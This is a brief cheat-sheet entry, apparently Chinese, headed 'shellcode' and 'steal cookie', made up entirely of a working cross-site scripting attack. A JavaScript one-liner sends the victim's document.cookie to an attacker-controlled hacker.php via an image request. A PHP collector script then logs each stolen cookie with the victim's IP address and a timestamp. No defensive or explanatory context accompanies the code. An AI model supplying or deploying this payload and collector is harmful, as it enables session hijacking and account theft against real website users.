### shellcode

#### 盗取cookie

```javascript
var img = new Image(); img.src="http://emlogb/hacker.php?x=" + document.cookie; document.body.append(img);
```

```php
<?php
$cookie = $_GET['x'];
$ip = getenv ('REMOTE_ADDR');
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>

```

